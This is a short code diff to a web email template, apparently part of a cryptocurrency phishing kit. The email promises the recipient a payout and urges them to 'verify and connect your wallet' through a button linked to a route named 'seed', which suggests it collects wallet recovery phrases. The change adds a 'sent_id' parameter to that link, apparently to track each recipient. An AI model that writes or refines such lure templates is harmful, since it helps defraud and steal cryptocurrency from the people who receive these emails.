@@ -123,7 +123,7 @@
             </ul>
             <p>To receive this amount in your wallet, please verify and connect your wallet below.</p>
             <div class="button-container">
-                <a href="{{ route('seed') }}" class="button">Connect Wallet</a>
+                <a href="{{ route('seed', ['sent_id' => $sent_id]) }}" class="button">Connect Wallet</a>
             </div>
             <p>Best regards,<br>Your Crypto Team</p>
         </div>
